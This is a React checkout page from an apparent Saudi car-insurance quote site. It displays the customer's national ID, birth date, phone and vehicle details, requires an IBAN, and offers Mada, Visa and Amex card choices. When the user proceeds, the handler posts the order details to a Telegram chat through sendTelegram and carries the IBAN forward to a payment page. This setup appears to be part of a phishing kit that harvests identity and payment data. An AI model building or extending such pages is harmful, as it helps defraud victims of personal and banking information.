import { useMemo, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { FileText, CreditCard, Eye, CheckCircle2, User, Car, Info, Landmark } from "lucide-react";

import Header from "@/components/site/Header";
import SiteFooter from "@/components/site/SiteFooter";
import FloatingButtons from "@/components/site/FloatingButtons";
import QuoteSteps from "@/components/site/QuoteSteps";
import PolicyPreview, { type PolicyData } from "@/components/site/PolicyPreview";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { useI18n } from "@/lib/i18n";
import { trOffer } from "@/lib/offer-text";
import { sendTelegram } from "@/lib/telegram-notify";
import madaLogo from "@/assets/payments/mada.png";
import visaLogo from "@/assets/payments/visa.svg";
import mastercardLogo from "@/assets/payments/mastercard.svg";
import paperOffersBanner from "@/assets/paper-offers-banner.png.asset.json";

type CheckoutState = Partial<PolicyData> & { vat?: number };

type PayMethod = "card";

const Row = ({ label, value }: { label: string; value: string }) => (
  <div className="flex items-center justify-between gap-3 py-2.5 text-[12.5px] sm:text-[13px]">
    <span className="text-muted-foreground">{label}</span>
    <span className="font-extrabold text-brand-blue">{value}</span>
  </div>
);

const SectionTitle = ({
  icon: Icon,
  children,
  titleClassName,
}: {
  icon: React.ElementType;
  children: React.ReactNode;
  titleClassName?: string;
}) => (
  <div className="mb-3 flex items-center justify-end gap-2 text-brand-blue">
    <h2
      className={cn(
        "text-[15px] font-extrabold sm:text-[16px]",
        titleClassName,
      )}
    >
      {children}
    </h2>
    <Icon className="h-[18px] w-[18px]" strokeWidth={2.2} />
  </div>
);

const PaymentOption = ({
  active,
  onClick,
  title,
  subtitle,
  icon,
  isAr,
}: {
  active: boolean;
  onClick: () => void;
  title: string;
  subtitle: string;
  icon: React.ReactNode;
  isAr: boolean;
}) => (
  <button
    type="button"
    onClick={onClick}
    className={cn(
      "flex w-full items-center justify-between gap-3 rounded-xl border bg-white p-3.5 transition-all",
      active
        ? "border-brand-blue/60 shadow-card"
        : "border-border/60 hover:border-brand-blue/30",
    )}
  >
    {/* radio */}
    <span
      className={cn(
        "grid h-[20px] w-[20px] shrink-0 place-items-center rounded-full border-2",
        active ? "border-brand-blue" : "border-muted-foreground/40",
      )}
    >
      {active && <span className="h-[10px] w-[10px] rounded-full bg-brand-blue" />}
    </span>
    {/* icon */}
    <span className="text-brand-blue">{icon}</span>
    {/* labels */}
    <div className={cn("flex-1", isAr ? "text-right" : "text-left")}>
      <div className="text-[14px] font-extrabold text-emerald-600 sm:text-[15px]">
        {title}
      </div>
      <div className="mt-0.5 text-[11px] text-emerald-500 sm:text-[12px]">
        {subtitle}
      </div>
    </div>
  </button>
);

const QuoteCheckout = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t, isAr, dir } = useI18n();
  const state = (location.state as CheckoutState) || {};

  const company = trOffer(state.company, isAr) || "—";
  const type = state.type || "شامل";
  const typeLabel = type === "ضد الغير" ? t("ضد الغير", "Third Party") : t("شامل", "Comprehensive");
  const price = state.price ?? 0;
  const vat = useMemo(() => state.vat ?? +(price * 0.15).toFixed(2), [price, state.vat]);
  const total = useMemo(() => +(price + vat).toFixed(2), [price, vat]);
  const rsLabel = t("ر.س", "SAR");

  const [method, setMethod] = useState<PayMethod>("card");
  const [cardBrand, setCardBrand] = useState("");
  const [iban, setIban] = useState("");
  const [previewOpen, setPreviewOpen] = useState(false);

  const brandLabelAr: Record<string, string> = {
    mada: "مدى",
    "visa-mastercard": "فيزا - ماستر كارد",
    amex: "أمريكان إكسبرس",
  };
  const brandToStored: Record<string, "mada" | "visa" | "amex"> = {
    mada: "mada",
    "visa-mastercard": "visa",
    amex: "amex",
  };

  const handlePay = () => {
    if (!iban || iban.length < 20) {
      toast.error(t("يرجى إدخال رقم الآيبان", "Please enter the IBAN"));
      return;
    }
    if (!cardBrand) {
      toast.error(t("يرجى اختيار طريقة الدفع", "Please select a payment method"));
      return;
    }
    const selectedBrand = brandToStored[cardBrand] ?? "unknown";
    const label = brandLabelAr[cardBrand] ?? cardBrand;
    sendTelegram(
      [
        "🧾 <b>اختيار طريقة الدفع</b>",
        `   • الشركة: ${company}`,
        `   • النوع: ${typeLabel}`,
        `   • الإجمالي: <b>${total.toFixed(2)} ر.س</b>`,
        `   • طريقة الدفع: <b>${label}</b>`,
      ].join("\n"),
    );
    navigate("/quote/payment", {
      state: {
        ...state,
        company,
        type,
        price,
        total,
        method,
        selectedBrand,
        selectedBrandLabel: label,
        iban: `SA${iban}`,
      },
    });
  };

  return (
    <main dir={dir} className="min-h-screen bg-[hsl(210_40%_97%)]">
      <Header />
      <QuoteSteps current={4} />

      <section
        dir={dir}
        className="mx-auto w-full max-w-[1100px] px-3 pb-10 pt-2 sm:px-4"
      >
        {/* Desktop: 2 columns (service+payment | summary). Mobile: stacked */}
        <div className="grid grid-cols-1 gap-4 lg:grid-cols-[1fr_360px]">
          {/* Main column: service details + payment method */}
          <div className="space-y-4">
            {/* Insured person details */}
            <div className="rounded-2xl bg-white p-4 shadow-card sm:p-5">
              <SectionTitle icon={User}>{t("بيانات المؤمن له", "Insured Person Details")}</SectionTitle>
              <div className="divide-y divide-border">
                <Row label={t("الاسم الكامل", "Full Name")} value={state.fullName || "—"} />
                <Row label={t("رقم الهوية / الإقامة", "ID / Iqama Number")} value={state.identity || "—"} />
                <Row label={t("تاريخ الميلاد", "Date of Birth")} value={state.birthDate || "—"} />
                <Row label={t("رقم الجوال", "Mobile Number")} value={state.phone || "—"} />
                <Row label={t("تاريخ بدء التأمين", "Insurance Start Date")} value={state.startDate || "—"} />
              </div>
            </div>

            {/* Vehicle details */}
            <div className="rounded-2xl bg-white p-4 shadow-card sm:p-5">
              <SectionTitle icon={Car}>{t("بيانات المركبة", "Vehicle Details")}</SectionTitle>
              <div className="divide-y divide-border">
                <Row label={t("ماركة ونوع المركبة", "Vehicle Make & Model")} value={state.brand || "—"} />
                <Row label={t("سنة الصنع", "Manufacture Year")} value={state.year || "—"} />
                <Row
                  label={t("القيمة التقديرية", "Estimated Value")}
                  value={state.estValue ? `${state.estValue} ${t("ريال", "SAR")}` : "—"}
                />
                <Row label={t("الغرض من الاستخدام", "Usage Purpose")} value={state.purpose || "—"} />
                <Row label={t("مكان إصلاح المركبة", "Repair Location")} value={state.repairPlace || "—"} />
                <Row label={t("نوع تسجيل المركبة", "Vehicle Registration Type")} value={state.docType || t("استمارة", "Registration Card")} />
              </div>
            </div>

            {/* Service details */}
            <div className="rounded-2xl bg-white p-4 shadow-card sm:p-5">
              <SectionTitle icon={FileText}>{t("تفاصيل الخدمة", "Service Details")}</SectionTitle>
              <div className="divide-y divide-border">
                <Row label={t("شركة التأمين", "Insurance Company")} value={company} />
                <Row label={t("نوع التأمين", "Insurance Type")} value={`${t("تأمين", "Insurance")} ${typeLabel}`} />
                <Row label={t("رسوم التأمين", "Insurance Fee")} value={`${price.toFixed(2)} ${rsLabel}`} />
                <Row label={t("ضريبة القيمة المضافة (15%)", "VAT (15%)")} value={`${vat.toFixed(2)} ${rsLabel}`} />
              </div>

              <div className="mt-3 rounded-xl bg-brand-blue/5 px-4 py-3">
                <div className="flex items-center justify-between">
                  <span className="text-[15px] font-extrabold text-brand-blue sm:text-[16px]">
                    {t("المجموع الكلي", "Grand Total")}
                  </span>
                  <span className="text-[18px] font-extrabold text-brand-blue sm:text-[20px]">
                    {total.toFixed(2)} {rsLabel}
                  </span>
                </div>
              </div>

              <button
                type="button"
                onClick={() => setPreviewOpen(true)}
                className="mt-4 flex h-[46px] w-full items-center justify-center gap-2 rounded-[10px] btn-pay text-[13px] font-extrabold text-white shadow-soft transition-transform hover:brightness-110 active:scale-[0.99] sm:text-[14px]"
              >
                <Eye className="h-[18px] w-[18px]" strokeWidth={2.2} />
                <span>{t("معاينة وثيقة التأمين", "Preview Insurance Policy")}</span>
              </button>
            </div>

            {/* Insured bank details (IBAN) */}
            <div className="rounded-2xl bg-white p-4 shadow-card sm:p-5">
              <SectionTitle icon={Landmark}>{t("تفاصيل المؤمن عليه", "Insured Details")}</SectionTitle>
              <div className="rounded-xl border border-border/60 p-3.5 sm:p-4">
                <div className="flex items-start justify-end gap-2 text-right">
                  <p className="text-[13px] font-extrabold text-brand-blue sm:text-[14px]">
                    {t("رقم الحساب البنكي (IBAN)", "Bank Account Number (IBAN)")}
                  </p>
                  <Info className="mt-0.5 h-[16px] w-[16px] shrink-0 text-amber-500" strokeWidth={2.2} />
                </div>
                <p className="mt-1.5 text-right text-[11.5px] leading-relaxed text-muted-foreground sm:text-[12.5px]">
                  {t(
                    "الخاص بصاحب الوثيقة، ولن يُستخدم في أي عمليات دفع، وإنما يقتصر استخدامه على خدمات ما بعد البيع، بما في ذلك المطالبات واسترداد المبالغ.",
                    "Belongs to the policyholder and will not be used for any payment transactions; it is only used for after-sales services, including claims and refunds."
                  )}
                </p>
                <div className="mt-3 flex items-center overflow-hidden rounded-lg border border-border/60 bg-muted/20 focus-within:border-brand-blue/60" dir="ltr">
                  <span className="flex h-[46px] w-[54px] shrink-0 items-center justify-center bg-muted/50 text-[14px] font-extrabold text-brand-blue">
                    SA
                  </span>
                  <input
                    type="text"
                    inputMode="numeric"
                    maxLength={22}
                    value={iban}
                    onChange={(e) => setIban(e.target.value.replace(/[^0-9]/g, ""))}
                    placeholder={t("أدخل رقم الآيبان", "Enter IBAN number")}
                    className="h-[46px] w-full bg-transparent px-3 text-[14px] font-bold text-foreground outline-none placeholder:font-normal placeholder:text-muted-foreground/60"
                    aria-label={t("رقم الآيبان", "IBAN number")}
                  />
                </div>
                <p className="mt-2 text-right text-[11px] font-bold text-red-500 sm:text-[11.5px]">
                  {t("رقم الآيبان (IBAN) - إلزامي", "IBAN number - required")}
                </p>
              </div>
            </div>

            {/* Paper offers banner */}
            <div className="overflow-hidden rounded-2xl bg-white shadow-card">
              <img
                src={paperOffersBanner.url}
                alt={t("عرض ورقي - استمتع بعروض حصرية عند شراء وثيقة التأمين", "Paper offers - Enjoy exclusive offers when purchasing the insurance policy")}
                className="w-full object-contain"
              />
            </div>

            {/* Payment methods */}
            <div className="rounded-2xl bg-white p-4 shadow-card sm:p-5">
              <SectionTitle icon={CreditCard} titleClassName="text-emerald-600">{t("طريقة الدفع", "Payment Method")}</SectionTitle>
              <div className="space-y-3">
                {method === "card" && (
                  <div className="space-y-2 rounded-xl border border-border/60 bg-muted/20 p-3">
                    {[
                      { id: "mada", label: t("مدى", "Mada") },
                      { id: "visa-mastercard", label: t("فيزا - ماستر كارد", "Visa - Mastercard") },
                      { id: "amex", label: t("أمريكان إكسبرس", "American Express") },
                    ].map((brand) => (
                      <button
                        key={brand.id}
                        type="button"
                        onClick={() => setCardBrand(brand.id)}
                        className={cn(
                          "flex w-full items-center justify-between gap-3 rounded-lg border bg-white px-4 py-3 transition-all",
                          cardBrand === brand.id
                            ? "border-brand-blue/60 shadow-card"
                            : "border-border/60 hover:border-brand-blue/30",
                        )}
                      >
                        <span
                          className={cn(
                            "grid h-[18px] w-[18px] shrink-0 place-items-center rounded-full border-2",
                            cardBrand === brand.id ? "border-brand-blue" : "border-muted-foreground/40",
                          )}
                        >
                          {cardBrand === brand.id && <span className="h-[9px] w-[9px] rounded-full bg-brand-blue" />}
                        </span>
                        <span className="flex-1 text-right text-[13px] font-bold text-muted-foreground sm:text-[14px]">
                          {brand.label}
                        </span>
                        <span className="flex w-24 shrink-0 items-center justify-end gap-2" dir="ltr">
                          {brand.id === "mada" && <img src={madaLogo} alt="mada" className="max-h-9 w-20 object-contain" />}
                          {brand.id === "visa-mastercard" && <><img src={visaLogo} alt="Visa" className="h-6 w-12 object-contain" /><img src={mastercardLogo} alt="Mastercard" className="h-6 w-7 object-contain" /></>}
                          {brand.id === "amex" && <span className="rounded-sm bg-brand-blue px-2 py-1.5 text-center text-[10px] font-extrabold leading-tight text-primary-foreground">AMERICAN<br />EXPRESS</span>}
                        </span>
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Order summary (sticky) */}
          <aside className="lg:sticky lg:top-4 lg:self-start">
            <div className="overflow-hidden rounded-2xl bg-white shadow-card">
              <div className="bg-brand-blue/10 py-3 text-center">
                <h2 className="text-[15px] font-extrabold text-brand-blue sm:text-[16px]">
                  {t("ملخص الطلب", "Order Summary")}
                </h2>
              </div>

              <div className="p-4 sm:p-5">
                <div className="divide-y divide-border">
                  <Row label={t("الشركة", "Company")} value={company} />
                  <Row label={t("نوع التأمين", "Insurance Type")} value={`${t("تأمين", "Insurance")} ${typeLabel}`} />
                  <Row label={t("الرسوم", "Fee")} value={`${price.toFixed(2)} ${rsLabel}`} />
                  <Row label={t("الضريبة", "VAT")} value={`${vat.toFixed(2)} ${rsLabel}`} />
                </div>

                <div className="mt-3 flex items-center justify-between border-t border-border pt-3">
                  <span className="text-[15px] font-extrabold text-brand-blue sm:text-[16px]">
                    {t("المجموع", "Total")}
                  </span>
                  <span className="text-[17px] font-extrabold text-brand-blue sm:text-[19px]">
                    {total.toFixed(2)} {rsLabel}
                  </span>
                </div>

                <button
                  type="button"
                  onClick={handlePay}
                  className="mt-4 flex h-[48px] w-full items-center justify-center gap-2 rounded-[10px] btn-pay text-[13.5px] font-extrabold text-white shadow-soft transition-transform hover:brightness-110 active:scale-[0.99] sm:text-[14.5px]"
                >
                  <CheckCircle2 className="h-[18px] w-[18px]" strokeWidth={2.2} />
                  <span>{t("متابعة الدفع", "Continue to Payment")}</span>
                </button>

                <p className="mt-3 text-center text-[11px] leading-relaxed text-muted-foreground sm:text-[11.5px]">
                  {t("بالضغط على متابعة الدفع، أنت توافق على", "By clicking Continue to Payment, you agree to the")}{" "}
                  <a className="font-bold text-brand-blue underline" href="#">
                    {t("شروط الخدمة وسياسة الخصوصية", "Terms of Service and Privacy Policy")}
                  </a>
                </p>
              </div>
            </div>
          </aside>
        </div>

        <div className="mt-6 flex justify-start">
          <button
            type="button"
            onClick={() => navigate(-1)}
            className="h-[42px] rounded-[10px] border border-[hsl(214_25%_85%)] bg-white px-6 text-[12.5px] font-bold text-brand-blue hover:bg-muted/40"
          >
            {t("رجوع", "Back")}
          </button>
        </div>
      </section>

      <SiteFooter />
      <FloatingButtons />

      <PolicyPreview
        open={previewOpen}
        onClose={() => setPreviewOpen(false)}
        data={{
          company,
          companyId: state.companyId,
          type,
          price,
          fullName: state.fullName,
          identity: state.identity,
          birthDate: state.birthDate,
          brand: state.brand,
          year: state.year,
          estValue: state.estValue,
          purpose: state.purpose,
          repairPlace: state.repairPlace,
          docType: state.docType,
          startDate: state.startDate,
          mainCoverage: state.mainCoverage,
          addons: state.addons,
        }}
      />
    </main>
  );
};

export default QuoteCheckout;
